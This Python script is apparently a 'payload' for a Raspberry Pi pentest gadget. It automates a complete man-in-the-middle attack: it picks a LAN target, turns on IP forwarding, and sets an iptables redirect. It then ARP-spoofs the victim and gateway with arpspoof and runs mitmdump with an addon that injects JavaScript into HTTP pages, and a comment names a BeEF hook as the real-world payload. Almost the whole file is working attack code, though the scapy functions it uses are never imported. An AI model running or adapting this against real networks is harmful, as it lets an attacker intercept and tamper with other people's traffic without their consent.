#!/usr/bin/env python3
"""
RaspyJack *payload* – **MITM Code Injector (eth0)**
====================================================
An advanced, "stronger" Man-in-the-Middle payload that actively injects
JavaScript into non-HTTPS web pages visited by a target on the network.

This payload automates:
1.  ARP spoofing to become the gateway for a target.
2.  Setting up `iptables` to redirect HTTP traffic to a transparent proxy.
3.  Running `mitmdump` (from mitmproxy) with a script that injects a
    JavaScript alert into HTML pages.

This demonstrates active traffic manipulation, a powerful pentesting technique.

**Disclaimer:** This is a powerful and intrusive tool. Use only on networks
where you have explicit authorization.
"""

# ---------------------------------------------------------------------------
# 0) Imports & boilerplate
# ---------------------------------------------------------------------------
import os, sys, subprocess, signal, time, threading
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))

# ---------------------------- Third‑party libs ----------------------------
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

# ---------------------------------------------------------------------------
# 1) GPIO mapping (BCM)
# ---------------------------------------------------------------------------
PINS: dict[str, int] = { "OK": 13, "KEY3": 16 } # Simplified

# ---------------------------------------------------------------------------
# 2) GPIO & LCD initialisation
# ---------------------------------------------------------------------------
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = 128, 128
FONT = ImageFont.load_default()
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)

# ---------------------------------------------------------------------------
# 3) Global State & Configuration
# ---------------------------------------------------------------------------
ETH_INTERFACE = "eth0"
MITMPROXY_PORT = 8080
running = True
attack_processes = {}
status_message = "Starting..."
injection_count = 0

# The Python script for mitmdump to run
INJECTOR_SCRIPT_CONTENT = """
import re
from mitmproxy import http

# Simple JavaScript to inject. A real attack would use a BeEF hook.
JS_PAYLOAD = '<script>alert("RaspyJack was here!");</script>'

class Injector:
    def response(self, flow: http.HTTPFlow) -> None:
        # Only inject into successful responses of HTML content
        if flow.response and flow.response.status_code == 200 and "text/html" in flow.response.headers.get("Content-Type", ""):
            html = flow.response.get_text()
            # Use regex to find the closing head tag, case-insensitive
            html = re.sub(r"</head>", JS_PAYLOAD + "</head>", html, flags=re.IGNORECASE)
            flow.response.set_text(html)
            # Let the main payload know we injected a page
            with open("/tmp/raspyjack_injector.log", "a") as f:
                f.write("injected\\n")

addons = [Injector()]
"""
INJECTOR_SCRIPT_PATH = "/tmp/raspyjack_injector.py"

# ---------------------------------------------------------------------------
# 4) Graceful shutdown
# ---------------------------------------------------------------------------
def cleanup(*_):
    global running
    if running:
        running = False
        
        # Kill all subprocesses
        for proc in attack_processes.values():
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            except (ProcessLookupError, AttributeError):
                pass
        attack_processes.clear()
        
        # Restore system state
        subprocess.run("iptables -F", shell=True)
        subprocess.run("iptables -t nat -F", shell=True)
        subprocess.run("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)
        
        # Clean up temp files
        if os.path.exists(INJECTOR_SCRIPT_PATH):
            os.remove(INJECTOR_SCRIPT_PATH)
        if os.path.exists("/tmp/raspyjack_injector.log"):
            os.remove("/tmp/raspyjack_injector.log")

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

# ---------------------------------------------------------------------------
# 5) UI Functions
# ---------------------------------------------------------------------------
def draw_ui():
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), "MITM Code Injector", font=FONT_TITLE, fill="#FF0000")
    d.line([(0, 22), (128, 22)], fill="#FF0000", width=1)

    d.text((5, 25), f"Status: {status_message}", font=FONT, fill="yellow")
    d.text((5, 45), f"Injections: {injection_count}", font=FONT_TITLE, fill="lime")
    
    d.text((5, 115), "Press KEY3 to Stop", font=FONT, fill="cyan")
    LCD.LCD_ShowImage(img, 0, 0)

# ---------------------------------------------------------------------------
# 6) Core Attack Logic
# ---------------------------------------------------------------------------
def run_attack():
    global status_message, attack_processes
    
    try:
        # Get gateway and target IPs
        status_message = "Finding gateway..."
        gateway_ip = subprocess.check_output("ip route | awk '/default/ {print $3}'", shell=True).decode().strip()
        
        # For simplicity, we'll target the first non-gateway host we find
        status_message = "Finding target..."
        network_range = subprocess.check_output(f"ip -o -4 addr show {ETH_INTERFACE} | awk '{{print $4}}'", shell=True).decode().strip()
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network_range), timeout=5, iface=ETH_INTERFACE, verbose=0)
        
        target_ip = None
        for _, r in ans:
            if r.psrc != gateway_ip:
                target_ip = r.psrc
                break
        
        if not target_ip:
            status_message = "No target found!"
            return

        # Write the mitmproxy injector script
        with open(INJECTOR_SCRIPT_PATH, "w") as f:
            f.write(INJECTOR_SCRIPT_CONTENT)
        if os.path.exists("/tmp/raspyjack_injector.log"):
            os.remove("/tmp/raspyjack_injector.log")

        # Enable IP forwarding
        status_message = "Enabling forwarding..."
        subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True, check=True)
        
        # Set up iptables for transparent proxy
        status_message = "Configuring iptables..."
        subprocess.run(f"iptables -t nat -A PREROUTING -i {ETH_INTERFACE} -p tcp --dport 80 -j REDIRECT --to-port {MITMPROXY_PORT}", shell=True, check=True)
        
        # Start ARP spoofing in the background
        status_message = f"ARP spoofing {target_ip}"
        cmd_arp_victim = f"arpspoof -i {ETH_INTERFACE} -t {target_ip} {gateway_ip}"
        cmd_arp_gateway = f"arpspoof -i {ETH_INTERFACE} -t {gateway_ip} {target_ip}"
        attack_processes['arp_victim'] = subprocess.Popen(cmd_arp_victim, shell=True, preexec_fn=os.setsid)
        attack_processes['arp_gateway'] = subprocess.Popen(cmd_arp_gateway, shell=True, preexec_fn=os.setsid)
        
        # Start mitmdump
        status_message = "Starting mitmdump..."
        cmd_mitm = f"mitmdump -T --listen-port {MITMPROXY_PORT} -s {INJECTOR_SCRIPT_PATH}"
        attack_processes['mitm'] = subprocess.Popen(cmd_mitm, shell=True, preexec_fn=os.setsid)
        
        status_message = "Injecting..."
        
    except Exception as e:
        status_message = f"Error: {str(e)[:20]}"
        print(f"Error during attack setup: {e}", file=sys.stderr)
        cleanup()

# ---------------------------------------------------------------------------
# 7) Main Loop
# ---------------------------------------------------------------------------
try:
    # Check dependencies
    if subprocess.run("which mitmdump", shell=True, capture_output=True).returncode != 0:
        status_message = "mitmdump not found!"
        draw_ui()
        time.sleep(5)
        raise SystemExit("mitmdump not found")
    if subprocess.run("which arpspoof", shell=True, capture_output=True).returncode != 0:
        status_message = "arpspoof not found!"
        draw_ui()
        time.sleep(5)
        raise SystemExit("arpspoof not found")

    attack_thread = threading.Thread(target=run_attack, daemon=True)
    attack_thread.start()

    while running:
        # Check for new injections
        if os.path.exists("/tmp/raspyjack_injector.log"):
            with open("/tmp/raspyjack_injector.log", "r") as f:
                injection_count = len(f.readlines())
                
        draw_ui()
        
        if GPIO.input(PINS["KEY3"]) == 0:
            cleanup()
            break
        
        time.sleep(1)

except (KeyboardInterrupt, SystemExit):
    pass
except Exception as e:
    print(f"[ERROR] {e}", file=sys.stderr)
finally:
    cleanup()
    draw_ui() # To show final status
    time.sleep(1)
    LCD.LCD_Clear()
    GPIO.cleanup()
    print("MITM Code Injector payload finished.")
